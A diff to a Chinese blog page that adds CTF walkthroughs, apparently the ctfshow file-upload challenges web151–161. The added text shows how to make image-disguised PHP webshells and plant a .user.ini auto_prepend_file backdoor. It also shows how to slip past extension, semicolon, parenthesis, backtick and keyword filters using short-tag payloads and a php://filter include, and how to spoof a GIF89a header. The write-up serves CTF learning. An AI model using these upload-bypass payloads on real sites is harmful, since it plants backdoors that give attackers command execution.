@@ -412,14 +412,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-01-23
+                    2022-01-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    733
+                    1.3k
                 </div>
                 
 
@@ -480,6 +480,45 @@ auto_prepend_file = 1.jpg
 <p>3.<strong>getimagesize():</strong> 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p>
 <p> 可以加GIF89a图片头进行欺骗</p>
 <p>也可以  1.png /b +2.php 3.png</p>
+<h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>上传图片马，然后在burpsuie里把后缀png更改为php，再去执行命令即可，制作图片马方法</p>
+<pre class="line-numbers language-none"><code class="language-none">用一张小点的图片和一句话木马，利用copy命令生成图片马
+copy 1.png/b+2.php/a 3.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>同上</p>
+<h2 id="web-153"><a href="#web-153" class="headerlink" title="web 153"></a>web 153</h2><p>开始对php后缀进行了限制，这里我们利用<code>.user.ini</code>来构造后门</p>
+<blockquote>
+<p>php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">//.user.ini
+auto_prepend_file=1.png
+
+//1.png
+&lt;?php phpinfo();?&gt;
+
+//1.php(任意php文件)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>满足这三个文件在同一目录下，则相当于在1.php文件里插入了包含语句<code>require('1.png')</code>，进行了文件包含，所以我们就依次上传即可</p>
+<h2 id="web-154"><a href="#web-154" class="headerlink" title="web 154"></a>web 154</h2><p>继续按照上题步骤，传一个<code>.user.ini</code>文件，接着在上传图片马的时候报错了</p>
+<p>解码后显示的文字是不支持格式，说明可能内容里的php被ban了，改成短标签的形式再上传，发现可以通过</p>
+<pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=system("tac ../f*");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web-155"><a href="#web-155" class="headerlink" title="web 155"></a>web 155</h2><p>同上</p>
+<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>同上</p>
+<h2 id="web-157"><a href="#web-157" class="headerlink" title="web 157"></a>web 157</h2><p>一样用上题(web154)的办法可以通过，但过滤了分号，把短标签后面的<code>;</code>去掉，即</p>
+<pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=system("tac ../f*")?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>同上</p>
+<h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>这里把()给ban了，我们采用反引号来执行命令，即</p>
+<pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=`tac ../f*`?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web-160"><a href="#web-160" class="headerlink" title="web 160"></a>web 160</h2><p>依旧上传个<code>.user.ini</code>文件，但在传图片马的时候把反引号给ban了，我们使用include命令去配合php伪协议进行读取，因为把php给ban了，所以我们需要拼接起来，即</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?=include"ph"."p://filter/convert.base64-encode/resource=../flag.p"."hp"?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>这次上传失败了，尝试在头部加了图片文件头，就过去了，所以这里应该是用了getimagesize()进行检测</p>
+<blockquote>
+<p><strong>getimagesize():</strong> 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p>
+</blockquote>
+<p>所以在上题的基础上都加个GIF89a图片头就可以了</p>
 
                 
             </div>
@@ -1007,7 +1046,7 @@ auto_prepend_file = 1.jpg
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">8.7k</span>
+                        class="white-color">9.3k</span>
             
             
             
